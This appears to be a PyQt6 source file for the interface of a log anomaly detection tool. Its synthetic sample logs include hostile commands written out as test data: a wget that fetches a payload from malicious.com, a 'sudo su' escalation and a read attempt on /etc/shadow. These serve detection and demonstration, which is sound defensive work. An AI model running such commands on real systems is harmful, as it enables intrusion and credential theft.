"""

Log Anomaly Analysis Interface.



Provides a workspace for ingesting and analyzing system logs.

Leverages statistical models and heuristic pattern matching to identify

security incidents, unauthorized access, and operational irregularities.

"""

from PyQt6.QtWidgets import(QWidget, QVBoxLayout, QHBoxLayout, QLabel, 

QPushButton, QTextEdit, QGroupBox, QFileDialog, QFrame, 

QScrollArea, QSizePolicy )

from PyQt6.QtCore import Qt, QThreadPool 

from PyQt6.QtGui import QFont, QPalette, QColor 

from utils.workers import Worker 

import config 





class AnomalyTab(QWidget ):

    """

    User interface for the Log Anomaly Detection module.

    

    Attributes:

        log_input(QTextEdit): Text area for log ingestion.

        results_layout(QVBoxLayout): Container for analysis results.

    """



    def __init__(self, parent ):

        """setup the tab layout and event handlers."""

        super().__init__()

        self.parent =parent 

        self._is_analyzing =False 

        self.init_ui()



    def init_ui(self ):

        """build the visual hierarchy of the log analyzer."""

        layout =QVBoxLayout()

        layout.setSpacing(20 )



        #header

        title =QLabel("📊 Log Anomaly Detector")

        title.setFont(QFont("Segoe UI",20, QFont.Weight.Bold ))

        layout.addWidget(title )



        #instructions

        desc =QLabel("Upload or paste system logs to detect suspicious patterns and anomalies. "

        "The AI engine identifies deviations from normal operational baselines, including failed logins and privilege escalation.")

        desc.setWordWrap(True )

        desc.setStyleSheet("color: #666; font-size: 13px;")

        layout.addWidget(desc )



        #input Control Group

        input_group =QGroupBox("Data Ingestion")

        input_layout =QVBoxLayout()



        #toolbar

        button_layout =QHBoxLayout()



        upload_btn =QPushButton("📁 Upload Log File")

        upload_btn.setToolTip("Import logs from local filesystem")

        upload_btn.setCursor(Qt.CursorShape.PointingHandCursor )

        upload_btn.clicked.connect(self.upload_log_file )



        sample_btn =QPushButton("📝 Load Sample Data")

        sample_btn.setToolTip("Populate with synthetic training data")

        sample_btn.setCursor(Qt.CursorShape.PointingHandCursor )

        sample_btn.clicked.connect(self.load_sample_logs )



        self._analyze_btn =QPushButton("🔍 Analyze Logs")

        self._analyze_btn.setToolTip("Execute anomaly detection algorithms")

        self._analyze_btn.setCursor(Qt.CursorShape.PointingHandCursor )

        self._analyze_btn.clicked.connect(self.analyze_logs )



        clear_btn =QPushButton("🗑 Clear")

        clear_btn.setCursor(Qt.CursorShape.PointingHandCursor )

        clear_btn.clicked.connect(self.clear_logs )



        button_layout.addWidget(upload_btn )

        button_layout.addWidget(sample_btn )

        button_layout.addWidget(self._analyze_btn )

        button_layout.addWidget(clear_btn )



        input_layout.addLayout(button_layout )



        #text Editor

        self.log_input =QTextEdit()

        self.log_input.setPlaceholderText("Paste raw log content here or upload a file...")

        self.log_input.setMinimumHeight(140 )

        self.log_input.setSizePolicy(

        QSizePolicy.Policy.Expanding, 

        QSizePolicy.Policy.Expanding 

        )

        self.log_input.setFont(QFont("Consolas",10 ))

        self.log_input.setStyleSheet("""

            QTextEdit {

                color: #2c3e50;

                background-color: #fAFAFA;

                border: 1px solid #e0E0E0;

                border-radius: 4px;

                padding: 8px;

            }

        """)

        input_layout.addWidget(self.log_input )



        input_group.setLayout(input_layout )

        layout.addWidget(input_group )



        #analysis Output Container — wrapped in QScrollArea so 10 anomaly frames don't overflow

        self.results_group =QGroupBox("Analysis Report")

        results_outer_layout =QVBoxLayout()



        results_scroll =QScrollArea()

        results_scroll.setWidgetResizable(True )

        results_scroll.setFrameShape(QFrame.Shape.NoFrame )



        results_container =QWidget()

        self.results_layout =QVBoxLayout(results_container )

        self.results_layout.setContentsMargins(0, 5 ,0, 5 )

        self.results_layout.setAlignment(Qt.AlignmentFlag.AlignTop )



        #default placeholder state

        self.results_placeholder =QLabel("Waiting for log data...")

        self.results_placeholder.setAlignment(Qt.AlignmentFlag.AlignCenter )

        self.results_placeholder.setStyleSheet("color: #999; padding: 40px; font-style: italic;")

        self.results_layout.addWidget(self.results_placeholder )



        results_scroll.setWidget(results_container )

        results_outer_layout.addWidget(results_scroll )

        self.results_group.setLayout(results_outer_layout )

        self.results_group.setMinimumHeight(300 )

        layout.addWidget(self.results_group )



        layout.addStretch()

        self.setLayout(layout )



    def upload_log_file(self ):

        """

        Handle file upload dialog and read content.

        

        Supports.log and.txt files.

        """

        file_path, _ =QFileDialog.getOpenFileName(

        self ,

        "Select Log File",

        "",

        "Log Files(*.log *.txt);;All Files(*.*)"

        )



        if file_path :

            try :

                with open(file_path ,'r',encoding ='utf-8',errors ='ignore')as f :

                    content =f.read()

                self.log_input.setPlainText(content )

            except Exception as e :

                self.log_input.setPlainText(f"Error reading file: {str(e)}")



    def load_sample_logs(self ):

        """Populate the input area with synthetic log data for demonstration."""

        sample_logs ="""INFO 2024-01-15 10:23:45 User login successful user = john ip = 192.168.1.100

INFO 2024-01-15 10:24:12 File access granted path=/home/john/documents

INFO 2024-01-15 10:25:33 db connection established db = main_db

ERROR 2024-01-15 10:26:01 Login failed user = admin ip = 203.0.113.45 reason = invalid_password

ERROR 2024-01-15 10:26:15 Login failed user = admin ip = 203.0.113.45 reason = invalid_password

ERROR 2024-01-15 10:26:28 Login failed user = admin ip = 203.0.113.45 reason = invalid_password

ERROR 2024-01-15 10:26:42 Login failed user = admin ip = 203.0.113.45 reason = invalid_password

WARNING 2024-01-15 10:27:10 Multiple failed login attempts detected ip = 203.0.113.45

INFO 2024-01-15 10:30:22 User login successful user = alice ip = 192.168.1.105

DEBUG 2024-01-15 10:31:45 Cache hit key = user_profile_alice

INFO 2024-01-15 10:35:12 Session created session_id = xyz789

WARNING 2024-01-15 10:40:33 Privilege escalation attempt user = bob command = sudo su

ERROR 2024-01-15 10:41:02 Unauthorized access attempt path=/etc/shadow user = bob

WARNING 2024-01-15 10:42:15 Suspicious command detected user = bob command = wget http://malicious.com/payload.sh

INFO 2024-01-15 10:45:00 System backup completed status = success

INFO 2024-01-15 10:50:22 User logout user = john session_duration = 27min

DEBUG 2024-01-15 10:55:10 Memory usage normal 42%

INFO 2024-01-15 11:00:00 Scheduled task executed task = cleanup status = success"""



        self.log_input.setPlainText(sample_logs )



    def clear_logs(self ):

        """Reset the input area.

        

        Also resets the analysis guard so a new analysis can be started

        immediately \u2014 guards against the tab becoming permanently locked

        if the user clears the input while a worker is still in-flight.

        """

        self.log_input.clear()

        #reset guard in case a worker is still in-flight

        self._is_analyzing =False 

        self._analyze_btn.setEnabled(True )

        self.log_input.setReadOnly(False )



    def analyze_logs(self ):

        """

        runs the log analysis workflow asynchronously.

        """

        if self._is_analyzing :

            return 



        log_content =self.log_input.toPlainText().strip()

        if not log_content :

            return 



        self._is_analyzing =True 

        self._analyze_btn.setEnabled(False )

        self.log_input.setReadOnly(True )



        #reset display and show loading

        while self.results_layout.count():

            child =self.results_layout.takeAt(0 )

            if child.widget():

                child.widget().deleteLater()



        self.loading_label =QLabel("Analyzing logs via Isolation Forest, please wait...")

        self.loading_label.setAlignment(Qt.AlignmentFlag.AlignCenter )

        self.loading_label.setStyleSheet("color: #666; padding: 40px; font-style: italic;")

        self.results_layout.addWidget(self.loading_label )



        from ui.animations import LoadingAnimation 

        self.loading_anim =LoadingAnimation(self.loading_label.setText ,"Analyzing logs via Isolation Forest, please wait")

        self.loading_anim.start()



        #initiate Async Worker

        worker =Worker(self.parent.anomaly_detector.analyze_logs, log_content )

        worker.signals.result.connect(self._on_worker_result )

        worker.signals.error.connect(self._on_worker_error )

        QThreadPool.globalInstance().start(worker )



    def _on_worker_result(self, result :dict ):

        if hasattr(self ,'loading_anim'):

            self.loading_anim.stop()

        self._is_analyzing =False 

        self._analyze_btn.setEnabled(True )

        self.log_input.setReadOnly(False )

        self._handle_analysis_result(result )



    def _on_worker_error(self, err :tuple ):

        if hasattr(self ,'loading_anim'):

            self.loading_anim.stop()

        self._is_analyzing =False 

        self._analyze_btn.setEnabled(True )

        self.log_input.setReadOnly(False )

        self.display_error(f"Analysis failed: {err[1]}")



    def _handle_analysis_result(self, result :dict ):

        """Process background worker result and structure UI reporting"""

        #clear loading

        while self.results_layout.count():

            child =self.results_layout.takeAt(0 )

            if child.widget():

                child.widget().deleteLater()



                #render Results

        if 'error'in result :

            self.display_error(result['error'])

        else :

            self.display_results(result )



            #persist Audit Trail

            try :

                self.parent.db.add_scan(

                'log_anomaly',

                f"{result['total_lines']} lines",

                result.get('severity','unknown'),

                result.get('anomaly_rate',0.0 )

                )



                #trigger Alert Logic for High-Severity Findings

                if result.get('severity')in['high','critical']:

                    self.parent.db.add_alert(

                    'log_anomaly',

                    result['severity'],

                    result.get('message','Anomalies detected'),

                    f"Found {result.get('anomaly_count', 0)} anomalies in {result.get('total_lines', 0)} lines"

                    )

            except Exception as e :

                print(f"Database sync failed: {e}")



                #gamification Hook

            try :

                self.parent.gamification.award_scan_xp()

            except Exception as e :

                pass 



    def display_error(self, error_msg :str ):

        """Render error feedback."""

        error_label =QLabel(f"❌ Analysis Failed: {error_msg}")

        error_label.setStyleSheet(f"color: {config.COLOR_DANGER}; font-weight: bold; padding: 20px;")

        error_label.setWordWrap(True )

        self.results_layout.addWidget(error_label )



    def display_results(self, result :dict ):

        """

        Render the full analysis report.

        

        Args:

            result(dict): Analysis data containing statistics and anomalies.

        """

        #1. Executive Summary

        summary_card =self.create_summary_card(result )

        self.results_layout.addWidget(summary_card )



        #2. Pattern Matching Findings

        patterns_widget =self.create_patterns_widget(result )

        self.results_layout.addWidget(patterns_widget )



        #3. Itemized Anomalies

        if result.get('anomalies'):

            anomalies_widget =self.create_anomalies_widget(result['anomalies'])

            self.results_layout.addWidget(anomalies_widget )



    def create_summary_card(self, result :dict )->QWidget :

        """

        build a visual summary of the analysis.

        """

        frame =QFrame()

        frame.setFrameShape(QFrame.Shape.StyledPanel )



        #dynamic styling based on severity

        bg_color ={

        'low':config.COLOR_SAFE ,

        'medium':config.COLOR_WARNING ,

        'high':config.COLOR_DANGER ,

        'critical':'#8B0000'

        }.get(result.get('severity','low'),config.COLOR_SAFE )



        frame.setStyleSheet(f"""

            QFrame {{

                background-color: {bg_color};

                border-radius: 12px;

                padding: 24px;

            }}

            QLabel {{

                color: white;

            }}

        """)



        layout =QVBoxLayout()



        #assessment Message

        message_label =QLabel(result['message'])

        message_label.setFont(QFont("Segoe UI",20, QFont.Weight.Bold ))

        message_label.setAlignment(Qt.AlignmentFlag.AlignCenter )



        #key Metrics

        stats_label =QLabel(

        f"Volume: {result['total_lines']} lines | "

        f"Anomalies: {result['anomaly_count']} ({result.get('anomaly_rate', 0):.1%}) | "

        f"Verdict: {result['severity'].upper()}"

        )

        stats_label.setFont(QFont("Segoe UI",12 ))

        stats_label.setAlignment(Qt.AlignmentFlag.AlignCenter )



        layout.addWidget(message_label )

        layout.addWidget(stats_label )



        frame.setLayout(layout )

        return frame 



    def create_patterns_widget(self, result :dict )->QWidget :

        """

        Render heuristic pattern matching results.

        """

        group =QGroupBox("Detected Threat Patterns")

        group.setStyleSheet("QGroupBox { font-weight: bold; }")

        layout =QVBoxLayout()



        patterns =result.get('patterns_detected',{})



        if not any(patterns.values()):

            no_patterns =QLabel("✓ No known attack signatures detected")

            no_patterns.setStyleSheet(f"color: {config.COLOR_SAFE}; padding: 10px;")

            layout.addWidget(no_patterns )

        else :

            for pattern_name, count in patterns.items():

                if count >0 :

                    pattern_label =QLabel(f"⚠ {pattern_name.replace('_', ' ').title()}: {count} occurrences")

                    pattern_label.setStyleSheet(f"color: {config.COLOR_DANGER}; font-weight: bold; padding: 5px;")

                    layout.addWidget(pattern_label )



        group.setLayout(layout )

        return group 



    def create_anomalies_widget(self, anomalies :list )->QWidget :

        """

        Render list of specific log entries flagged as anomalous.

        """

        group =QGroupBox(f"Anomalous Entries(Top {min(10, len(anomalies))})")

        group.setStyleSheet("QGroupBox { font-weight: bold; }")

        layout =QVBoxLayout()



        for anomaly in anomalies[:10 ]:#limit display to top 10

            anomaly_frame =QFrame()

            anomaly_frame.setFrameShape(QFrame.Shape.StyledPanel )



            #subtle danger styling

            anomaly_frame.setStyleSheet(f"""

                QFrame {{

                    background-color: #fFF5F5;

                    border-left: 4px solid {config.COLOR_DANGER};

                    border-radius: 4px;

                    padding: 8px;

                    margin-bottom: 5px;

                }}

            """)



            anomaly_layout =QVBoxLayout()

            anomaly_layout.setSpacing(2 )



            #metadata Header

            header =QLabel(f"Line {anomaly['line_number']} • {anomaly['reason']}")

            header.setFont(QFont("Segoe UI",10, QFont.Weight.Bold ))

            header.setStyleSheet(f"color: {config.COLOR_DANGER};")



            #log Content(Monospace)

            content =QLabel(anomaly['content'])

            content.setWordWrap(True )

            content.setStyleSheet("font-family: 'Consolas', monospace; font-size: 11px; color: #333;")



            anomaly_layout.addWidget(header )

            anomaly_layout.addWidget(content )



            anomaly_frame.setLayout(anomaly_layout )

            layout.addWidget(anomaly_frame )



        group.setLayout(layout )

        return group 

